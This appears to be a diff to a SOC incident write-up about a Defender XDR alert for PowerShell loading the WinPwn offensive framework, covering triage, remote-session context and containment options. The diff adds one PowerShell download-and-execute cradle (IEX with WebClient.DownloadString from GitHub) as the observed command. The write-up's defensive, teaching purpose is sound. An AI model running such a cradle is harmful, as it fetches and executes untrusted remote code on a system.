@@ -33,7 +33,11 @@ The alert was triggered when PowerShell executed a remote download-and-execute c
 The investigation began by reviewing the Defender XDR process tree. The initiating process, powershell_ise.exe, spawned a child powershell.exe process that executed a remote PowerShell script directly from a public GitHub repository.
 
 The command leveraged:
-
+```powershell
+iex (New-Object Net.WebClient).DownloadString(
+'https://raw.githubusercontent.com/...'
+)
+```
 Invoke-Expression (IEX)
 Net.WebClient.DownloadString()
 
@@ -45,10 +49,10 @@ The downloaded content originated from the WinPwn framework, an offensive securi
 
 While WinPwn has legitimate use cases, its capabilities include:
 
-Privilege escalation discovery
-Active Directory enumeration
-Credential harvesting activities
-Security misconfiguration identification
+- Privilege escalation discovery
+- Active Directory enumeration
+- Credential harvesting activities
+- Security misconfiguration identification
 
 Because these capabilities overlap with attacker tradecraft, execution of the framework generated a Defender XDR alert.
 
@@ -56,8 +60,8 @@ Remote Session Context
 
 Additional investigation revealed that the PowerShell activity originated from a remote session associated with:
 
-Source Device: LAPTOP-FKQ39MRR
-Source IP: 10.5.0.2
+- Source Device: LAPTOP-FKQ39MRR
+- Source IP: 10.5.0.2
 
 This finding expanded the scope of the investigation beyond the affected endpoint and identified another system requiring review.
 
@@ -71,10 +75,10 @@ The PowerShell download cradle itself was classified as Medium severity because 
 
 However, Defender XDR assigned the incident a High risk level due to contextual factors including:
 
-High-integrity process execution
-Remote session involvement
-Potential access to additional systems
-Increased opportunity for lateral movement
+- High-integrity process execution
+- Remote session involvement
+- Potential access to additional systems
+- Increased opportunity for lateral movement
 
 This demonstrates how effective triage requires evaluating both the technical behavior and the broader operational context.
 
@@ -82,12 +86,12 @@ This demonstrates how effective triage requires evaluating both the technical be
 
 Following validation of suspicious activity, several containment and investigation actions were available through Microsoft Defender XDR:
 
-Isolate the affected device
-Initiate automated investigation and response
-Collect a forensic investigation package
-Restrict application execution
-Launch a live response session
-Conduct environment-wide hunting for related indicators
+- Isolate the affected device
+- Initiate automated investigation and response
+- Collect a forensic investigation package
+- Restrict application execution
+- Launch a live response session
+- Conduct environment-wide hunting for related indicators
 
 These actions support rapid containment and help prevent further attacker activity within the environment.
 
